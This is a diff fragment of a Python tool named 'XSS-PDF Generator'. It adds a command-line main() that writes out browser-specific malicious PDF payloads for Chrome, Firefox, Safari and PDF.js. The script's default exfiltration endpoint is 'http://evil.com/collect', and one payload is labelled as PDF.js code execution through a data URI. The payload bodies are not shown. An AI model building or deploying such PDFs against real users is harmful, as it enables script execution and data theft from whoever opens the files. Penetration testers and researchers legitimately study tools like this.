@@ -1428,4 +1428,52 @@ startxref
 413
 %%EOF"""
     write_pdf(f"{output_dir}/pdfjs_data_uri.pdf", payload9, 
-              "PDF.js code execution via data URI
+              "PDF.js code execution via data URI to execute JavaScript", pdf_version)
+
+def main():
+    """Main function to generate all PDF payloads in Files directory."""
+    import argparse
+    
+    parser = argparse.ArgumentParser(description="XSS-PDF Generator - Browser-specific PDF payloads")
+    parser.add_argument("-u", "--url", default="http://evil.com/collect", 
+                       help="Target URL for data exfiltration")
+    parser.add_argument("-o", "--output-dir", default="Files", 
+                       help="Output directory for PDF files (default: Files)")
+    parser.add_argument("-b", "--browser", choices=["chrome", "firefox", "safari", "pdfjs", "all"], 
+                       default="all", help="Target browser (default: all)")
+    parser.add_argument("-v", "--pdf-version", choices=list(PDF_VERSIONS.keys()), 
+                       default="1.7", help="PDF version (default: 1.7)")
+    
+    args = parser.parse_args()
+    
+    print(f"🚀 XSS-PDF Generator")
+    print(f"Target URL: {args.url}")
+    print(f"Output Directory: {args.output_dir}")
+    print(f"Browser Target: {args.browser}")
+    print(f"PDF Version: {args.pdf_version}")
+    print()
+    
+    # Create output directory
+    create_directory(args.output_dir)
+    
+    # Generate payloads based on browser selection
+    if args.browser == "all" or args.browser == "chrome":
+        print("🔥 Generating Chrome payloads...")
+        generate_chrome_payloads(args.url, args.output_dir, args.pdf_version)
+        
+    if args.browser == "all" or args.browser == "firefox":
+        print("🔥 Generating Firefox payloads...")
+        generate_firefox_payloads(args.url, args.output_dir, args.pdf_version)
+        
+    if args.browser == "all" or args.browser == "safari":
+        print("🔥 Generating Safari payloads...")
+        generate_safari_payloads(args.url, args.output_dir, args.pdf_version)
+        
+    if args.browser == "all" or args.browser == "pdfjs":
+        print("🔥 Generating PDF.js payloads...")
+        generate_pdfjs_payloads(args.url, args.output_dir, args.pdf_version)
+    
+    print(f"\n✅ PDF generation complete! Files saved in {args.output_dir}/ directory")
+
+if __name__ == "__main__":
+    main()
